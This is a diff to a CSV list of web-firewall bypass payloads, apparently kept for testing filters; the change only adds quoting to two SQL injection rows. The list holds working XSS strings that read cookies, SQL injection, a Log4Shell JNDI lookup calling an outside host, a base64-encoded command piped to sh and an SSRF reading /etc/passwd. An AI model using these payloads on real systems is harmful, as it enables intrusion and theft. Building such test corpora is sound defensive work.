@@ -369,7 +369,7 @@ https://waf-bypass.com/,<h1/%6f%6e/oNclicK=alert``>XSS,xss
 https://waf-bypass.com/,<svg/%6f%6e/oNloaD=alert``>,xss
 https://waf-bypass.com/,"${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}}",rce
 https://waf-bypass.com/,%27/**/%256fR/**/50%2521%253D22%253B%2523,sqli
-https://waf-bypass.com/,0%20/*!union*/%20/*!select*/%201,2,3,4,user(),6,7,version(),9,10,11,sqli
+https://waf-bypass.com/,"0%20/*!union*/%20/*!select*/%201,2,3,4,user(),6,7,version(),9,10,11",sqli
 https://waf-bypass.com/,"<svg onpointerenter=jQuery.globalEval(""al""+""ert(documen""+""t.cooki""+""e)"");>",xss
 https://waf-bypass.com/,<svg onload=alert&#0000000040document.cookie)>,xss
 https://waf-bypass.com/,<img+src=x+on<!--ram-->error=ale<!--ram-->rt(1)>,xss
@@ -399,6 +399,6 @@ https://waf-bypass.com/,-1′ and .0union+distinct+select+1+–+,sqli
 https://waf-bypass.com/,qaramany'%2buser_name(@@version)--,sqli
 https://waf-bypass.com/,1%27/** /%256FR/** /50%2521%253D22%253B%2523,sqli
 https://waf-bypass.com/,%2522%252B%254F%2552%252B%2531%2521%253D%2537%2523,sqli
-https://waf-bypass.com/,1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(‘{hex_query}’))),’>{brute_force}(.+)?@<‘,’i’),sqli
+https://waf-bypass.com/,"1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(‘{hex_query}’))),’>{brute_force}(.+)?@<‘,’i’)",sqli
 https://waf-bypass.com/,printf dW5hbWUgLWE= | base64 -d | sh,rce
 https://waf-bypass.com/,target[.]com/download?url=[shortened link of http://ssrfip/download?url=file:///etc/passwd],ssrf
